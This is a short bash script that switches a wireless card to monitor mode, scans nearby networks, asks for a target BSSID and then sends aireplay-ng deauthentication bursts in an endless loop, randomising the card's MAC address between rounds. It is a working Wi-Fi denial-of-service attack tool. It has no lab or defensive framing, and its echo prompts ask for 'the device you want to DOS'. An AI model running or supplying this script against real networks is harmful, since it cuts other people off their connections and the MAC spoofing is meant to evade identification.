#!/bin/bash

# brings wireless card down, changes MAC address and mode to monitor
ifconfig wlan0 down
macchanger -r wlan0 | grep "New MAC"
iwconfig wlan0 mode monitor
ifconfig wlan0 up

echo "Initialisation complete, please select the device you want to DOS."
sleep 3

# displays all active networks within range + info
airodump-ng wlan0

echo "What is the BSSID of the device you want to DOS??"
read BSSID

while true
do
    aireplay-ng -0 5 $BSSID wlan0
    ifconfig wlan0 down
    macchanger -r wlan0 | grep "New MAC"

    iwconfig wlan0 mode monitor

    ifconfig wlan0 up
    iwconfig wlan0 | grep Mode
    sleep 3
    echo Waiting!

done
